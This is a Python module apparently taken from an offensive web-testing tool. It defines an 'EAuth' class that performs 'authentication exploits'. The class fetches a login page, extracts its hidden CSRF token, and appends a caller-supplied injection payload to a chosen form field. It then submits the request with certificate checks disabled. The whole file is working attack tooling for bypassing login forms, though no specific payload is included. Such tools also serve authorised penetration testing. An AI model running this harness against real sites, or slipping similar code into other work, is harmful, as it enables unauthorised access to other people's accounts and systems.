#!/usr/bin/env python
"""Module for EAuth class"""

import re
from typing import Dict, Literal, Union

import requests
import urllib3
from bs4 import BeautifulSoup
from requests.cookies import cookiejar_from_dict
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class EAuth:
    """
    EAuth class for handling authentication exploits.

    Args:
        target (str): The target URL for the authentication exploit.
        payload (str): The payload to inject during the exploit.
        data (Dict[str, str]): Additional data needed for the exploit.
        parameter (str): The parameter in the data to inject the payload.
        method (Literal["POST", "GET"], optional): The HTTP method for the exploit, default is "POST".
        proxies (Union[Dict[str, str], None], optional): Proxy settings, default is None.
        cookies (Union[Dict[str, str], None], optional): Cookie settings, default is None.
        csrf (Union[str, None], optional): CSRF token for the exploit, default is None.
        timeout (int, optional): Timeout for the HTTP requests, default is 10.

    Attributes:
        target (str): The validated target URL.
        payload (str): The payload to inject during the exploit.
        method (Literal["POST", "GET"]): The HTTP method for the exploit.
        data (Dict[str, str]): Additional data needed for the exploit.
        parameter (str): The parameter in the data to inject the payload.
        proxies (Union[Dict[str, str], None]): Proxy settings.
        cookies (Union[Dict[str, str], None]): Cookie settings.
        csrf (Union[str, None]): CSRF token for the exploit.
        timeout (int): Timeout for the HTTP requests.
        console (Console): Rich library Console instance.
        session (requests.Session): Requests session for making HTTP requests.
    """

    def __init__(
        self,
        *,
        target: str,
        payload: str,
        data: dict,
        parameter: str,
        method: Literal["POST", "GET"] = "POST",
        proxies: Union[dict, None] = None,
        cookies: Union[dict, None] = None,
        csrf: Union[str, None] = None,
        timeout: int = 10,
    ):
        self.target: str = target
        self.payload: str = payload
        self.method: Literal["POST", "GET"] = method
        self.data: Dict[str, str] = data
        self.parameter: str = parameter
        self.proxies: Union[Dict[str, str], None] = proxies
        self.cookies: Union[Dict[str, str], None] = cookies
        self.timeout: int = timeout
        self.csrf: Union[str, None] = csrf
        self.console: Console = Console()
        self.session = requests.Session()

    @property
    def target(self) -> str:
        """Getter for the target property."""
        return self._target

    @target.setter
    def target(self, value: str) -> None:
        """
        Setter for the target property.

        Args:
            value (str): The target URL to set.

        Raises:
            ValueError: If the provided URL is invalid.
        """
        pattern = re.compile(
            "^(http[s]?:\\/\\/(www\\.)?|ftp:\\/\\/(www\\.)?|www\\.){1}([0-9A-Za-z-\\.@:%_\+~#=]+)+((\\.[a-zA-Z]{2,3})+)(/(.)*)?(\\?(.)*)?"
        )
        if re.match(pattern, value):
            self._target = value
        else:
            raise ValueError("Invalid URL format!")

    def exploit(self) -> requests.Response:
        """
        Perform the authentication exploit.

        Returns:
            requests.Response: The HTTP response from the exploit.

        Raises:
            ValueError: If the HTTP method or injectable parameter is invalid.
        """
        kwargs: Dict = {
            "url": self.target,
            "timeout": self.timeout,
            "proxies": self.proxies,
            "cookies": self.cookies,
            "verify": False,
        }

        if self.csrf:
            response = self.session.get(**kwargs)
            soup = BeautifulSoup(response.text, "html.parser")
            inputs = soup.find_all("input", type="hidden")
            csrf_input = next(
                (_input["value"] for _input in inputs if _input["name"] == self.csrf),
                None,
            )
            if csrf_input:
                csrf = {self.csrf: csrf_input}
                self.data |= csrf

        if self.parameter and self.parameter in self.data:
            self.data[self.parameter] = f"{self.data[self.parameter]}{self.payload}"
        else:
            raise ValueError(f"Invalid injectable parameter: {self.parameter!r}")

        kwargs.setdefault("data", self.data)
        if self.method == "POST":
            response = self.session.post(**kwargs)
        elif self.method == "GET":
            response = self.session.get(**kwargs)
        else:
            raise ValueError("Invalid HTTP Method!")

        return response
